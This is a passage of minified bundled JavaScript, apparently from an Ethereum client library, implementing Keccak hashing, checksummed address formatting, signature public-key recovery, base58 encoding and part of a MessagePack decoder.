            n.length % 2 && (n = "0".concat(n));
            const o = n.length / 2
              , i = new Uint8Array(o);
            for (let s = 0, a = 0; s < o; s++) {
                const e = fs(n.charCodeAt(a++))
                  , t = fs(n.charCodeAt(a++));
                if (void 0 === e || void 0 === t)
                    throw new Ki('Invalid byte sequence ("'.concat(n[a - 2]).concat(n[a - 1], '" in "').concat(n, '").'));
                i[s] = 16 * e + t
            }
            return i
        }
        function gs(e) {
            let t = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : {};
            const r = us.encode(e);
            return "number" === typeof t.size ? (rs(r, {
                size: t.size
            }),
            Xi(r, {
                dir: "right",
                size: t.size
            })) : r
        }
        var ys = r(5449)
          , ms = r(6499);
        const bs = BigInt(0)
          , vs = BigInt(1)
          , ws = BigInt(2)
          , Ts = BigInt(7)
          , As = BigInt(256)
          , Es = BigInt(113)
          , Ps = []
          , Cs = []
          , Ss = [];
        for (let r = 0, zK = vs, VK = 1, HK = 0; r < 24; r++) {
            [VK,HK] = [HK, (2 * VK + 3 * HK) % 5],
            Ps.push(2 * (5 * HK + VK)),
            Cs.push((r + 1) * (r + 2) / 2 % 64);
            let e = bs;
            for (let t = 0; t < 7; t++)
                zK = (zK << vs ^ (zK >> Ts) * Es) % As,
                zK & ws && (e ^= vs << (vs << BigInt(t)) - vs);
            Ss.push(e)
        }
        const Is = (0,
        ys.lD)(Ss, !0)
          , Bs = Is[0]
          , xs = Is[1]
          , Os = (e, t, r) => r > 32 ? (0,
        ys.WM)(e, t, r) : (0,
        ys.P5)(e, t, r)
          , _s = (e, t, r) => r > 32 ? (0,
        ys.im)(e, t, r) : (0,
        ys.B4)(e, t, r);
        class Ws extends ms.Vw {
            constructor(e, t, r) {
                let n = arguments.length > 3 && void 0 !== arguments[3] && arguments[3]
                  , o = arguments.length > 4 && void 0 !== arguments[4] ? arguments[4] : 24;
                if (super(),
                this.pos = 0,
                this.posOut = 0,
                this.finished = !1,
                this.destroyed = !1,
                this.enableXOF = !1,
                this.blockLen = e,
                this.suffix = t,
                this.outputLen = r,
                this.enableXOF = n,
                this.rounds = o,
                (0,
                ms.Fe)(r),
                !(0 < e && e < 200))
                    throw new Error("only keccak-f1600 function is supported");
                this.state = new Uint8Array(200),
                this.state32 = (0,
                ms.DH)(this.state)
            }
            clone() {
                return this._cloneInto()
            }
            keccak() {
                (0,
                ms.fd)(this.state32),
                function(e) {
                    let t = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : 24;
                    const r = new Uint32Array(10);
                    for (let n = 24 - t; n < 24; n++) {
                        for (let n = 0; n < 10; n++)
                            r[n] = e[n] ^ e[n + 10] ^ e[n + 20] ^ e[n + 30] ^ e[n + 40];
                        for (let n = 0; n < 10; n += 2) {
                            const t = (n + 8) % 10
                              , o = (n + 2) % 10
                              , i = r[o]
                              , s = r[o + 1]
                              , a = Os(i, s, 1) ^ r[t]
                              , c = _s(i, s, 1) ^ r[t + 1];
                            for (let r = 0; r < 50; r += 10)
                                e[n + r] ^= a,
                                e[n + r + 1] ^= c
                        }
                        let t = e[2]
                          , o = e[3];
                        for (let r = 0; r < 24; r++) {
                            const n = Cs[r]
                              , i = Os(t, o, n)
                              , s = _s(t, o, n)
                              , a = Ps[r];
                            t = e[a],
                            o = e[a + 1],
                            e[a] = i,
                            e[a + 1] = s
                        }
                        for (let n = 0; n < 50; n += 10) {
                            for (let t = 0; t < 10; t++)
                                r[t] = e[n + t];
                            for (let t = 0; t < 10; t++)
                                e[n + t] ^= ~r[(t + 2) % 10] & r[(t + 4) % 10]
                        }
                        e[0] ^= Bs[n],
                        e[1] ^= xs[n]
                    }
                    (0,
                    ms.uH)(r)
                }(this.state32, this.rounds),
                (0,
                ms.fd)(this.state32),
                this.posOut = 0,
                this.pos = 0
            }
            update(e) {
                (0,
                ms.CC)(this),
                e = (0,
                ms.ZJ)(e),
                (0,
                ms.DO)(e);
                const {blockLen: t, state: r} = this
                  , n = e.length;
                for (let o = 0; o < n; ) {
                    const i = Math.min(t - this.pos, n - o);
                    for (let t = 0; t < i; t++)
                        r[this.pos++] ^= e[o++];
                    this.pos === t && this.keccak()
                }
                return this
            }
            finish() {
                if (this.finished)
                    return;
                this.finished = !0;
                const {state: e, suffix: t, pos: r, blockLen: n} = this;
                e[r] ^= t,
                0 !== (128 & t) && r === n - 1 && this.keccak(),
                e[n - 1] ^= 128,
                this.keccak()
            }
            writeInto(e) {
                (0,
                ms.CC)(this, !1),
                (0,
                ms.DO)(e),
                this.finish();
                const t = this.state
                  , {blockLen: r} = this;
                for (let n = 0, o = e.length; n < o; ) {
                    this.posOut >= r && this.keccak();
                    const i = Math.min(r - this.posOut, o - n);
                    e.set(t.subarray(this.posOut, this.posOut + i), n),
                    this.posOut += i,
                    n += i
                }
                return e
            }
            xofInto(e) {
                if (!this.enableXOF)
                    throw new Error("XOF is not possible for this instance");
                return this.writeInto(e)
            }
            xof(e) {
                return (0,
                ms.Fe)(e),
                this.xofInto(new Uint8Array(e))
            }
            digestInto(e) {
                if ((0,
                ms.Ht)(e, this),
                this.finished)
                    throw new Error("digest() was already called");
                return this.writeInto(e),
                this.destroy(),
                e
            }
            digest() {
                return this.digestInto(new Uint8Array(this.outputLen))
            }
            destroy() {
                this.destroyed = !0,
                (0,
                ms.uH)(this.state)
            }
            _cloneInto(e) {
                const {blockLen: t, suffix: r, outputLen: n, rounds: o, enableXOF: i} = this;
                return e || (e = new Ws(t,r,n,i,o)),
                e.state32.set(this.state32),
                e.pos = this.pos,
                e.posOut = this.posOut,
                e.finished = this.finished,
                e.rounds = o,
                e.suffix = r,
                e.outputLen = n,
                e.enableXOF = i,
                e.destroyed = this.destroyed,
                e
            }
        }
        const Rs = (e, t, r) => (0,
        ms.qj)(( () => new Ws(t,e,r)))
          , ks = ( () => Rs(1, 136, 32))();
        function Ms(e, t) {
            const r = t || "hex"
              , n = ks(Yi(e, {
                strict: !1
            }) ? ds(e) : e);
            return "bytes" === r ? n : ss(n)
        }
        class Ns extends Map {
            constructor(e) {
                super(),
                Object.defineProperty(this, "maxSize", {
                    enumerable: !0,
                    configurable: !0,
                    writable: !0,
                    value: void 0
                }),
                this.maxSize = e
            }
            get(e) {
                const t = super.get(e);
                return super.has(e) && void 0 !== t && (this.delete(e),
                super.set(e, t)),
                t
            }
            set(e, t) {
                if (super.set(e, t),
                this.maxSize && this.size > this.maxSize) {
                    const e = this.keys().next().value;
                    e && this.delete(e)
                }
                return this
            }
        }
        const Fs = new Ns(8192);
        function Us(e, t) {
            if (Fs.has("".concat(e, ".").concat(t)))
                return Fs.get("".concat(e, ".").concat(t));
            const r = t ? "".concat(t).concat(e.toLowerCase()) : e.substring(2).toLowerCase()
              , n = Ms(gs(r), "bytes")
              , o = (t ? r.substring("".concat(t, "0x").length) : r).split("");
            for (let s = 0; s < 40; s += 2)
                n[s >> 1] >> 4 >= 8 && o[s] && (o[s] = o[s].toUpperCase()),
                (15 & n[s >> 1]) >= 8 && o[s + 1] && (o[s + 1] = o[s + 1].toUpperCase());
            const i = "0x".concat(o.join(""));
            return Fs.set("".concat(e, ".").concat(t), i),
            i
        }
        function Ds(e) {
            if (0 === e || 1 === e)
                return e;
            if (27 === e)
                return 0;
            if (28 === e)
                return 1;
            throw new Error("Invalid yParityOrV value")
        }
        async function Ls(e) {
            let {hash: t, signature: n} = e;
            return function(e) {
                const t = Ms("0x".concat(e.substring(4))).substring(26);
                return Us("0x".concat(t))
            }(await async function(e) {
                let {hash: t, signature: n} = e;
                const o = Yi(t) ? t : ss(t)
                  , {secp256k1: i} = await r.e(869).then(r.bind(r, 5869))
                  , s = ( () => {
                    if ("object" === typeof n && "r"in n && "s"in n) {
                        const {r: e, s: t, v: r, yParity: o} = n
                          , s = Ds(Number(null !== o && void 0 !== o ? o : r));
                        return new i.Signature(ns(e),ns(t)).addRecoveryBit(s)
                    }
                    const e = Yi(n) ? n : ss(n);
                    if (65 !== ts(e))
                        throw new Error("invalid signature length");
                    const t = Ds(os("0x".concat(e.slice(130))));
                    return i.Signature.fromCompact(e.substring(2, 130)).addRecoveryBit(t)
                }
                )()
                  , a = s.recoverPublicKey(o.substring(2)).toHex(!1);
                return "0x".concat(a)
            }({
                hash: t,
                signature: n
            }))
        }
        const js = function(e) {
            if (e.length >= 255)
                throw new TypeError("Alphabet too long");
            const t = new Uint8Array(256);
            for (let a = 0; a < t.length; a++)
                t[a] = 255;
            for (let a = 0; a < e.length; a++) {
                const r = e.charAt(a)
                  , n = r.charCodeAt(0);
                if (255 !== t[n])
                    throw new TypeError(r + " is ambiguous");
                t[n] = a
            }
            const r = e.length
              , n = e.charAt(0)
              , o = Math.log(r) / Math.log(256)
              , i = Math.log(256) / Math.log(r);
            function s(e) {
                if ("string" !== typeof e)
                    throw new TypeError("Expected String");
                if (0 === e.length)
                    return new Uint8Array;
                let i = 0
                  , s = 0
                  , a = 0;
                for (; e[i] === n; )
                    s++,
                    i++;
                const c = (e.length - i) * o + 1 >>> 0
                  , l = new Uint8Array(c);
                for (; i < e.length; ) {
                    const n = e.charCodeAt(i);
                    if (n > 255)
                        return;
                    let o = t[n];
                    if (255 === o)
                        return;
                    let s = 0;
                    for (let e = c - 1; (0 !== o || s < a) && -1 !== e; e--,
                    s++)
                        o += r * l[e] >>> 0,
                        l[e] = o % 256 >>> 0,
                        o = o / 256 >>> 0;
                    if (0 !== o)
                        throw new Error("Non-zero carry");
                    a = s,
                    i++
                }
                let u = c - a;
                for (; u !== c && 0 === l[u]; )
                    u++;
                const d = new Uint8Array(s + (c - u));
                let h = s;
                for (; u !== c; )
                    d[h++] = l[u++];
                return d
            }
            return {
                encode: function(t) {
                    if (t instanceof Uint8Array || (ArrayBuffer.isView(t) ? t = new Uint8Array(t.buffer,t.byteOffset,t.byteLength) : Array.isArray(t) && (t = Uint8Array.from(t))),
                    !(t instanceof Uint8Array))
                        throw new TypeError("Expected Uint8Array");
                    if (0 === t.length)
                        return "";
                    let o = 0
                      , s = 0
                      , a = 0;
                    const c = t.length;
                    for (; a !== c && 0 === t[a]; )
                        a++,
                        o++;
                    const l = (c - a) * i + 1 >>> 0
                      , u = new Uint8Array(l);
                    for (; a !== c; ) {
                        let e = t[a]
                          , n = 0;
                        for (let t = l - 1; (0 !== e || n < s) && -1 !== t; t--,
                        n++)
                            e += 256 * u[t] >>> 0,
                            u[t] = e % r >>> 0,
                            e = e / r >>> 0;
                        if (0 !== e)
                            throw new Error("Non-zero carry");
                        s = n,
                        a++
                    }
                    let d = l - s;
                    for (; d !== l && 0 === u[d]; )
                        d++;
                    let h = n.repeat(o);
                    for (; d < l; ++d)
                        h += e.charAt(u[d]);
                    return h
                },
                decodeUnsafe: s,
                decode: function(e) {
                    const t = s(e);
                    if (t)
                        return t;
                    throw new Error("Non-base" + r + " character")
                }
            }
        };
        const zs = js("123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz");
        function Vs(e, t) {
            this.v = e,
            this.k = t
        }
        function Hs(e) {
            return function() {
                return new qs(e.apply(this, arguments))
            }
        }
        function qs(e) {
            var t, r;
            function n(t, r) {
                try {
                    var i = e[t](r)
                      , s = i.value
                      , a = s instanceof Vs;
                    Promise.resolve(a ? s.v : s).then((function(r) {
                        if (a) {
                            var c = "return" === t ? "return" : "next";
                            if (!s.k || r.done)
                                return n(c, r);
                            r = e[c](r).value
                        }
                        o(i.done ? "return" : "normal", r)
                    }
                    ), (function(e) {
                        n("throw", e)
                    }
                    ))
                } catch (e) {
                    o("throw", e)
                }
            }
            function o(e, o) {
                switch (e) {
                case "return":
                    t.resolve({
                        value: o,
                        done: !0
                    });
                    break;
                case "throw":
                    t.reject(o);
                    break;
                default:
                    t.resolve({
                        value: o,
                        done: !1
                    })
                }
                (t = t.next) ? n(t.key, t.arg) : r = null
            }
            this._invoke = function(e, o) {
                return new Promise((function(i, s) {
                    var a = {
                        key: e,
                        arg: o,
                        resolve: i,
                        reject: s,
                        next: null
                    };
                    r ? r = r.next = a : (t = r = a,
                    n(e, o))
                }
                ))
            }
            ,
            "function" != typeof e.return && (this.return = void 0)
        }
        function Gs(e) {
            return new Vs(e,0)
        }
        function $s(e) {
            var t = {}
              , r = !1;
            function n(t, n) {
                return r = !0,
                n = new Promise((function(r) {
                    r(e[t](n))
                }
                )),
                {
                    done: !1,
                    value: new Vs(n,1)
                }
            }
            return t["undefined" != typeof Symbol && Symbol.iterator || "@@iterator"] = function() {
                return this
            }
            ,
            t.next = function(e) {
                return r ? (r = !1,
                e) : n("next", e)
            }
            ,
            "function" == typeof e.throw && (t.throw = function(e) {
                if (r)
                    throw r = !1,
                    e;
                return n("throw", e)
            }
            ),
            "function" == typeof e.return && (t.return = function(e) {
                return r ? (r = !1,
                e) : n("return", e)
            }
            ),
            t
        }
        function Ks(e) {
            var t, r, n, o = 2;
            for ("undefined" != typeof Symbol && (r = Symbol.asyncIterator,
            n = Symbol.iterator); o--; ) {
                if (r && null != (t = e[r]))
                    return t.call(e);
                if (n && null != (t = e[n]))
                    return new Zs(t.call(e));
                r = "@@asyncIterator",
                n = "@@iterator"
            }
            throw new TypeError("Object is not async iterable")
        }
        function Zs(e) {
            function t(e) {
                if (Object(e) !== e)
                    return Promise.reject(new TypeError(e + " is not an object."));
                var t = e.done;
                return Promise.resolve(e.value).then((function(e) {
                    return {
                        value: e,
                        done: t
                    }
                }
                ))
            }
            return Zs = function(e) {
                this.s = e,
                this.n = e.next
            }
            ,
            Zs.prototype = {
                s: null,
                n: null,
                next: function() {
                    return t(this.n.apply(this.s, arguments))
                },
                return: function(e) {
                    var r = this.s.return;
                    return void 0 === r ? Promise.resolve({
                        value: e,
                        done: !0
                    }) : t(r.apply(this.s, arguments))
                },
                throw: function(e) {
                    var r = this.s.return;
                    return void 0 === r ? Promise.reject(e) : t(r.apply(this.s, arguments))
                }
            },
            new Zs(e)
        }
        function Ys(e) {
            return "".concat(e < 0 ? "-" : "", "0x").concat(Math.abs(e).toString(16).padStart(2, "0"))
        }
        qs.prototype["function" == typeof Symbol && Symbol.asyncIterator || "@@asyncIterator"] = function() {
            return this
        }
        ,
        qs.prototype.next = function(e) {
            return this._invoke("next", e)
        }
        ,
        qs.prototype.throw = function(e) {
            return this._invoke("throw", e)
        }
        ,
        qs.prototype.return = function(e) {
            return this._invoke("return", e)
        }
        ;
        class Js {
            constructor(e, t) {
                this.type = e,
                this.data = t
            }
        }
        class Xs extends Error {
            constructor(e) {
                super(e);
                const t = Object.create(Xs.prototype);
                Object.setPrototypeOf(this, t),
                Object.defineProperty(this, "name", {
                    configurable: !0,
                    enumerable: !1,
                    value: Xs.name
                })
            }
        }
        const Qs = 4294967295;
        function ea(e, t, r) {
            const n = Math.floor(r / 4294967296)
              , o = r;
            e.setUint32(t, n),
            e.setUint32(t + 4, o)
        }
        function ta(e, t) {
            return 4294967296 * e.getInt32(t) + e.getUint32(t + 4)
        }
        const ra = {
            type: -1,
            encode: function(e) {
                if (e instanceof Date) {
                    return function(e) {
                        let {sec: t, nsec: r} = e;
                        if (t >= 0 && r >= 0 && t <= 17179869183) {
                            if (0 === r && t <= 4294967295) {
                                const e = new Uint8Array(4);
                                return new DataView(e.buffer).setUint32(0, t),
                                e
                            }
                            {
                                const e = t / 4294967296
                                  , n = 4294967295 & t
                                  , o = new Uint8Array(8)
                                  , i = new DataView(o.buffer);
                                return i.setUint32(0, r << 2 | 3 & e),
                                i.setUint32(4, n),
                                o
                            }
                        }
                        {
                            const e = new Uint8Array(12)
                              , n = new DataView(e.buffer);
                            return n.setUint32(0, r),
                            ea(n, 4, t),
                            e
                        }
                    }(function(e) {
                        const t = e.getTime()
                          , r = Math.floor(t / 1e3)
                          , n = 1e6 * (t - 1e3 * r)
                          , o = Math.floor(n / 1e9);
                        return {
                            sec: r + o,
                            nsec: n - 1e9 * o
                        }
                    }(e))
                }
                return null
            },
            decode: function(e) {
                const t = function(e) {
                    const t = new DataView(e.buffer,e.byteOffset,e.byteLength);
                    switch (e.byteLength) {
                    case 4:
                        return {
                            sec: t.getUint32(0),
                            nsec: 0
                        };
                    case 8:
                        {
                            const e = t.getUint32(0);
                            return {
                                sec: 4294967296 * (3 & e) + t.getUint32(4),
                                nsec: e >>> 2
                            }
                        }
                    case 12:
                        return {
                            sec: ta(t, 4),
                            nsec: t.getUint32(0)
                        };
                    default:
                        throw new Xs("Unrecognized data size for timestamp (expected 4, 8, or 12): ".concat(e.length))
                    }
                }(e);
                return new Date(1e3 * t.sec + t.nsec / 1e6)
            }
        };
        class na {
            constructor() {
                this.builtInEncoders = [],
                this.builtInDecoders = [],
                this.encoders = [],
                this.decoders = [],
                this.register(ra)
            }
            register(e) {
                let {type: t, encode: r, decode: n} = e;
                if (t >= 0)
                    this.encoders[t] = r,
                    this.decoders[t] = n;
                else {
                    const e = -1 - t;
                    this.builtInEncoders[e] = r,
                    this.builtInDecoders[e] = n
                }
            }
            tryToEncode(e, t) {
                for (let r = 0; r < this.builtInEncoders.length; r++) {
                    const n = this.builtInEncoders[r];
                    if (null != n) {
                        const o = n(e, t);
                        if (null != o) {
                            return new Js(-1 - r,o)
                        }
                    }
                }
                for (let r = 0; r < this.encoders.length; r++) {
                    const n = this.encoders[r];
                    if (null != n) {
                        const o = n(e, t);
                        if (null != o) {
                            return new Js(r,o)
                        }
                    }
                }
                return e instanceof Js ? e : null
            }
            decode(e, t, r) {
                const n = t < 0 ? this.builtInDecoders[-1 - t] : this.decoders[t];
                return n ? n(e, t, r) : new Js(t,e)
            }
        }
        na.defaultCodec = new na;
        const oa = new TextEncoder;
        function ia(e, t, r) {
            e.length > 50 ? function(e, t, r) {
                oa.encodeInto(e, t.subarray(r))
            }(e, t, r) : function(e, t, r) {
                const n = e.length;
                let o = r
                  , i = 0;
                for (; i < n; ) {
                    let r = e.charCodeAt(i++);
                    if (0 !== (4294967168 & r)) {
                        if (0 === (4294965248 & r))
                            t[o++] = r >> 6 & 31 | 192;
                        else {
                            if (r >= 55296 && r <= 56319 && i < n) {
                                const t = e.charCodeAt(i);
                                56320 === (64512 & t) && (++i,
                                r = ((1023 & r) << 10) + (1023 & t) + 65536)
                            }
                            0 === (4294901760 & r) ? (t[o++] = r >> 12 & 15 | 224,
                            t[o++] = r >> 6 & 63 | 128) : (t[o++] = r >> 18 & 7 | 240,
                            t[o++] = r >> 12 & 63 | 128,
                            t[o++] = r >> 6 & 63 | 128)
                        }
                        t[o++] = 63 & r | 128
                    } else
                        t[o++] = r
                }
            }(e, t, r)
        }
        function sa(e, t, r) {
            let n = t;
            const o = n + r
              , i = [];
            let s = "";
            for (; n < o; ) {
                const t = e[n++];
                if (0 === (128 & t))
                    i.push(t);
                else if (192 === (224 & t)) {
                    const r = 63 & e[n++];
                    i.push((31 & t) << 6 | r)
                } else if (224 === (240 & t)) {
                    const r = 63 & e[n++]
                      , o = 63 & e[n++];
                    i.push((31 & t) << 12 | r << 6 | o)
                } else if (240 === (248 & t)) {
                    let r = (7 & t) << 18 | (63 & e[n++]) << 12 | (63 & e[n++]) << 6 | 63 & e[n++];
                    r > 65535 && (r -= 65536,
                    i.push(r >>> 10 & 1023 | 55296),
                    r = 56320 | 1023 & r),
                    i.push(r)
                } else
                    i.push(t);
                i.length >= 4096 && (s += String.fromCharCode(...i),
                i.length = 0)
            }
            return i.length > 0 && (s += String.fromCharCode(...i)),
            s
        }
        const aa = new TextDecoder;
        function ca(e, t, r) {
            return r > 200 ? function(e, t, r) {
                const n = e.subarray(t, t + r);
                return aa.decode(n)
            }(e, t, r) : sa(e, t, r)
        }
        function la(e) {
            return e instanceof Uint8Array ? e : ArrayBuffer.isView(e) ? new Uint8Array(e.buffer,e.byteOffset,e.byteLength) : function(e) {
                return e instanceof ArrayBuffer || "undefined" !== typeof SharedArrayBuffer && e instanceof SharedArrayBuffer
            }(e) ? new Uint8Array(e) : Uint8Array.from(e)
        }
        const ua = "array"
          , da = "map_key"
          , ha = "map_value"
          , fa = e => {
            if ("string" === typeof e || "number" === typeof e)
                return e;
            throw new Xs("The type of key must be string or number but " + typeof e)
        }
        ;
        class pa {
            constructor() {
                this.stack = [],
                this.stackHeadPosition = -1
            }
            get length() {
                return this.stackHeadPosition + 1
            }
            top() {
                return this.stack[this.stackHeadPosition]
            }
            pushArrayState(e) {
                const t = this.getUninitializedStateFromPool();
                t.type = ua,
                t.position = 0,
                t.size = e,
                t.array = new Array(e)
            }
            pushMapState(e) {
                const t = this.getUninitializedStateFromPool();
                t.type = da,
                t.readCount = 0,
                t.size = e,
                t.map = {}
            }
            getUninitializedStateFromPool() {
                if (this.stackHeadPosition++,
                this.stackHeadPosition === this.stack.length) {
                    const e = {
                        type: void 0,
                        size: 0,
                        array: void 0,
                        position: 0,
                        readCount: 0,
                        map: void 0,
                        key: null
                    };
                    this.stack.push(e)
                }
                return this.stack[this.stackHeadPosition]
            }
            release(e) {
                if (this.stack[this.stackHeadPosition] !== e)
                    throw new Error("Invalid stack state. Released state is not on top of the stack.");
                if (e.type === ua) {
                    const t = e;
                    t.size = 0,
                    t.array = void 0,
                    t.position = 0,
                    t.type = void 0
                }
                if (e.type === da || e.type === ha) {
                    const t = e;
                    t.size = 0,
                    t.map = void 0,
                    t.readCount = 0,
                    t.type = void 0
                }
                this.stackHeadPosition--
            }
            reset() {
                this.stack.length = 0,
                this.stackHeadPosition = -1
            }
        }
        const ga = new DataView(new ArrayBuffer(0))
          , ya = new Uint8Array(ga.buffer);
        try {
            ga.getInt8(0)
        } catch (_l) {
            if (!(_l instanceof RangeError))
                throw new Error("This module is not supported in the current JavaScript engine because DataView does not throw RangeError on out-of-bounds access")
        }
        const ma = new RangeError("Insufficient data")
          , ba = new class {
            constructor() {
                let e = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : 16
                  , t = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : 16;
                this.hit = 0,
                this.miss = 0,
                this.maxKeyLength = e,
                this.maxLengthPerKey = t,
                this.caches = [];
                for (let r = 0; r < this.maxKeyLength; r++)
                    this.caches.push([])
            }
            canBeCached(e) {
                return e > 0 && e <= this.maxKeyLength
            }
            find(e, t, r) {
                const n = this.caches[r - 1];
                e: for (const o of n) {
                    const n = o.bytes;
                    for (let o = 0; o < r; o++)
                        if (n[o] !== e[t + o])
                            continue e;
                    return o.str
                }
                return null
            }
            store(e, t) {
                const r = this.caches[e.length - 1]
                  , n = {
                    bytes: e,
                    str: t
                };
                r.length >= this.maxLengthPerKey ? r[Math.random() * r.length | 0] = n : r.push(n)
            }
            decode(e, t, r) {
                const n = this.find(e, t, r);
                if (null != n)
                    return this.hit++,
                    n;
                this.miss++;
                const o = sa(e, t, r)
                  , i = Uint8Array.prototype.slice.call(e, t, t + r);
                return this.store(i, o),
                o
            }
        }
        ;
        class va {
            constructor(e) {
                var t, r, n, o, i, s, a, c, l;
                this.totalPos = 0,
                this.pos = 0,
                this.view = ga,
                this.bytes = ya,
                this.headByte = -1,
                this.stack = new pa,
                this.entered = !1,
                this.extensionCodec = null !== (t = null === e || void 0 === e ? void 0 : e.extensionCodec) && void 0 !== t ? t : na.defaultCodec,
                this.context = null === e || void 0 === e ? void 0 : e.context,
                this.useBigInt64 = null !== (r = null === e || void 0 === e ? void 0 : e.useBigInt64) && void 0 !== r && r,
                this.rawStrings = null !== (n = null === e || void 0 === e ? void 0 : e.rawStrings) && void 0 !== n && n,
                this.maxStrLength = null !== (o = null === e || void 0 === e ? void 0 : e.maxStrLength) && void 0 !== o ? o : Qs,
                this.maxBinLength = null !== (i = null === e || void 0 === e ? void 0 : e.maxBinLength) && void 0 !== i ? i : Qs,
                this.maxArrayLength = null !== (s = null === e || void 0 === e ? void 0 : e.maxArrayLength) && void 0 !== s ? s : Qs,
                this.maxMapLength = null !== (a = null === e || void 0 === e ? void 0 : e.maxMapLength) && void 0 !== a ? a : Qs,
                this.maxExtLength = null !== (c = null === e || void 0 === e ? void 0 : e.maxExtLength) && void 0 !== c ? c : Qs,
                this.keyDecoder = void 0 !== (null === e || void 0 === e ? void 0 : e.keyDecoder) ? e.keyDecoder : ba,
                this.mapKeyConverter = null !== (l = null === e || void 0 === e ? void 0 : e.mapKeyConverter) && void 0 !== l ? l : fa
            }
            clone() {
                return new va({
                    extensionCodec: this.extensionCodec,
                    context: this.context,
                    useBigInt64: this.useBigInt64,
                    rawStrings: this.rawStrings,
                    maxStrLength: this.maxStrLength,
                    maxBinLength: this.maxBinLength,
                    maxArrayLength: this.maxArrayLength,
                    maxMapLength: this.maxMapLength,
                    maxExtLength: this.maxExtLength,
                    keyDecoder: this.keyDecoder
                })
            }
            reinitializeState() {
                this.totalPos = 0,
                this.headByte = -1,
                this.stack.reset()
            }
            setBuffer(e) {
                const t = la(e);
                this.bytes = t,
                this.view = new DataView(t.buffer,t.byteOffset,t.byteLength),
                this.pos = 0
            }
            appendBuffer(e) {
                if (-1 !== this.headByte || this.hasRemaining(1)) {
                    const t = this.bytes.subarray(this.pos)
                      , r = la(e)
                      , n = new Uint8Array(t.length + r.length);
                    n.set(t),
                    n.set(r, t.length),
                    this.setBuffer(n)
                } else
                    this.setBuffer(e)
            }
            hasRemaining(e) {
                return this.view.byteLength - this.pos >= e
            }
            createExtraByteError(e) {
                const {view: t, pos: r} = this;
                return new RangeError("Extra ".concat(t.byteLength - r, " of ").concat(t.byteLength, " byte(s) found at buffer[").concat(e, "]"))
            }
            decode(e) {
                if (this.entered) {
                    return this.clone().decode(e)
                }
                try {
                    this.entered = !0,
                    this.reinitializeState(),
                    this.setBuffer(e);
                    const t = this.doDecodeSync();
                    if (this.hasRemaining(1))
                        throw this.createExtraByteError(this.pos);
                    return t
                } finally {
                    this.entered = !1
                }
            }
            *decodeMulti(e) {
                if (this.entered) {
                    const t = this.clone();
                    yield*t.decodeMulti(e)
                } else
                    try {
                        for (this.entered = !0,
                        this.reinitializeState(),
                        this.setBuffer(e); this.hasRemaining(1); )
                            yield this.doDecodeSync()
                    } finally {
                        this.entered = !1
                    }
            }
            async decodeAsync(e) {
                if (this.entered) {
                    return this.clone().decodeAsync(e)
                }
                try {
                    this.entered = !0;
                    let a, c = !1;
                    var t, r = !1, n = !1;
                    try {
                        for (var o, i = Ks(e); r = !(o = await i.next()).done; r = !1) {
                            const e = o.value;
                            if (c)
                                throw this.entered = !1,
                                this.createExtraByteError(this.totalPos);
                            this.appendBuffer(e);
                            try {
                                a = this.doDecodeSync(),
                                c = !0
                            } catch (_l) {
                                if (!(_l instanceof RangeError))
                                    throw _l
                            }
                            this.totalPos += this.pos
                        }
                    } catch (s) {
                        n = !0,
                        t = s
                    } finally {
                        try {
                            r && null != i.return && await i.return()
                        } finally {
                            if (n)
                                throw t
                        }
                    }
                    if (c) {
                        if (this.hasRemaining(1))
                            throw this.createExtraByteError(this.totalPos);
                        return a
                    }
                    const {headByte: l, pos: u, totalPos: d} = this;
                    throw new RangeError("Insufficient data in parsing ".concat(Ys(l), " at ").concat(d, " (").concat(u, " in the current buffer)"))
                } finally {
                    this.entered = !1
                }
            }
            decodeArrayStream(e) {
                return this.decodeMultiAsync(e, !0)
            }
            decodeStream(e) {
                return this.decodeMultiAsync(e, !1)
            }
            decodeMultiAsync(e, t) {
                var r = this;
                return Hs((function*() {
                    if (r.entered) {
                        const n = r.clone();
                        yield*$s(Ks(n.decodeMultiAsync(e, t)))
                    } else
                        try {
                            r.entered = !0;
                            let l = t
                              , u = -1;
                            var n, o = !1, i = !1;
                            try {
                                for (var s, a = Ks(e); o = !(s = yield Gs(a.next())).done; o = !1) {
                                    const e = s.value;
                                    if (t && 0 === u)
                                        throw r.createExtraByteError(r.totalPos);
                                    r.appendBuffer(e),
                                    l && (u = r.readArraySize(),
                                    l = !1,
                                    r.complete());
                                    try {
                                        for (; yield r.doDecodeSync(),
                                        0 !== --u; )
                                            ;
                                    } catch (_l) {
                                        if (!(_l instanceof RangeError))
                                            throw _l
                                    }
                                    r.totalPos += r.pos
                                }
                            } catch (c) {
                                i = !0,
                                n = c
                            } finally {
                                try {
                                    o && null != a.return && (yield Gs(a.return()))
                                } finally {
                                    if (i)
                                        throw n
                                }
                            }
                        } finally {
                            r.entered = !1
                        }
                }
                ))()
            }
            doDecodeSync() {
                e: for (; ; ) {
                    const e = this.readHeadByte();
                    let t;
                    if (e >= 224)
                        t = e - 256;
                    else if (e < 192)
                        if (e < 128)
                            t = e;
                        else if (e < 144) {
                            const r = e - 128;
                            if (0 !== r) {
                                this.pushMapState(r),
                                this.complete();
                                continue e
                            }
                            t = {}
                        } else if (e < 160) {
                            const r = e - 144;
                            if (0 !== r) {
                                this.pushArrayState(r),
                                this.complete();
                                continue e
                            }
                            t = []
                        } else {
                            const r = e - 160;
                            t = this.decodeString(r, 0)
                        }
                    else if (192 === e)
                        t = null;
                    else if (194 === e)
                        t = !1;
                    else if (195 === e)
                        t = !0;
                    else if (202 === e)
                        t = this.readF32();
                    else if (203 === e)
                        t = this.readF64();
                    else if (204 === e)
                        t = this.readU8();
                    else if (205 === e)
                        t = this.readU16();
                    else if (206 === e)
                        t = this.readU32();
                    else if (207 === e)
                        t = this.useBigInt64 ? this.readU64AsBigInt() : this.readU64();
                    else if (208 === e)
                        t = this.readI8();
                    else if (209 === e)
                        t = this.readI16();
                    else if (210 === e)
                        t = this.readI32();
                    else if (211 === e)
                        t = this.useBigInt64 ? this.readI64AsBigInt() : this.readI64();
                    else if (217 === e) {
                        const e = this.lookU8();
                        t = this.decodeString(e, 1)
                    } else if (218 === e) {
                        const e = this.lookU16();
                        t = this.decodeString(e, 2)
                    } else if (219 === e) {
                        const e = this.lookU32();
                        t = this.decodeString(e, 4)
                    } else if (220 === e) {
                        const e = this.readU16();
                        if (0 !== e) {
